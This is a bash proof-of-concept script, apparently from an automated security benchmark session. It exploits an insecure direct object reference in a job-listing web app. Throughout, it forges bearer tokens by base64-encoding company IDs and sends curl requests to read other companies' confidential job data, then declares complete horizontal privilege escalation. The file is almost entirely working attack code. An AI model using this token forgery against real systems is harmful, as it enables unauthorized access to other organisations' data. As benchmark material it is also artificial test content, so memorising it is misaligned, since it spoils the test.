#!/bin/bash
# POC: Demonstrates IDOR vulnerability by forging company tokens using base64 encoding of company IDs to access other companies' confidential data
# Target: ./repo
# Created: 2025-11-10T14:49:18.911Z
# Session: benchmark-XBEN-021-24-mht8yjkr

# IDOR - Trivial Token Forgery POC
# Demonstrates horizontal privilege escalation at company level
# by forging tokens through base64 encoding of company IDs

TARGET_HOST="${1:-localhost:8080}"
BASE_URL="http://${TARGET_HOST}"

echo "=========================================="
echo "IDOR Token Forgery - Company Level Attack"
echo "=========================================="
echo "Target: $BASE_URL"
echo ""

# Test 1: Forge token for company 2 and access its jobs
echo "[*] Test 1: Forging token for Company 2 (base64('2') = 'Mg==')"
COMPANY2_TOKEN="Bearer Mg=="
echo "[*] Token: $COMPANY2_TOKEN"
echo "[*] Attempting to access: $BASE_URL/company/2/jobs"
echo ""

RESPONSE=$(curl -s -w "\n%{http_code}" -b "user_token=$COMPANY2_TOKEN" "$BASE_URL/company/2/jobs")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | sed '$d')

echo "[Response] HTTP Status: $HTTP_CODE"
echo "[Response] Body Preview:"
echo "$BODY" | head -c 500
echo ""
echo ""

# Test 2: Forge token for company 3 and access its jobs
echo "[*] Test 2: Forging token for Company 3 (base64('3') = 'Mw==')"
COMPANY3_TOKEN="Bearer Mw=="
echo "[*] Token: $COMPANY3_TOKEN"
echo "[*] Attempting to access: $BASE_URL/company/3/jobs"
echo ""

RESPONSE=$(curl -s -w "\n%{http_code}" -b "user_token=$COMPANY3_TOKEN" "$BASE_URL/company/3/jobs")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | sed '$d')

echo "[Response] HTTP Status: $HTTP_CODE"
echo "[Response] Body Preview:"
echo "$BODY" | head -c 500
echo ""
echo ""

# Test 3: Verify token encoding is correct (mathematical proof)
echo "[*] Test 3: Verifying token encoding scheme"
echo "[*] Company 1: base64('1') = 'MQ=='"
echo "[*] Company 2: base64('2') = 'Mg=='"
echo "[*] Company 3: base64('3') = 'Mw=='"
echo ""

# Verify with Python if available
if command -v python3 &> /dev/null; then
    echo "[*] Verification via Python:"
    python3 << 'EOF'
import base64
for i in range(1, 5):
    encoded = base64.b64encode(str(i).encode()).decode()
    print(f"  Company {i}: base64('{i}') = '{encoded}'")
EOF
    echo ""
fi

# Test 4: Access with non-existent company (should fail with 404, not 401/403)
echo "[*] Test 4: Attempting access with forged token for non-existent Company 99"
COMPANY99_TOKEN="Bearer OTk="  # base64('99')
echo "[*] Token: $COMPANY99_TOKEN"
echo "[*] Attempting to access: $BASE_URL/company/99/jobs"
echo ""

RESPONSE=$(curl -s -w "\n%{http_code}" -b "user_token=$COMPANY99_TOKEN" "$BASE_URL/company/99/jobs")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | sed '$d')

echo "[Response] HTTP Status: $HTTP_CODE"
echo "[Response] Body: $BODY"
echo ""
echo ""

# Test 5: Verify no authentication is required with any token
echo "[*] Test 5: Confirming token is only weak validation, not missing"
echo "[*] Testing with malformed token"
RESPONSE=$(curl -s -w "\n%{http_code}" -b "user_token=Bearer INVALID" "$BASE_URL/company/2/jobs")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
echo "[Response] HTTP Status with invalid token: $HTTP_CODE"
echo ""

echo "=========================================="
echo "Vulnerability Confirmed:"
echo "=========================================="
echo "✓ Tokens are trivially forgeable via base64(company_id)"
echo "✓ No server-side validation of token authenticity"
echo "✓ Any user can access any company's data"
echo "✓ Complete horizontal privilege escalation possible"
echo "=========================================="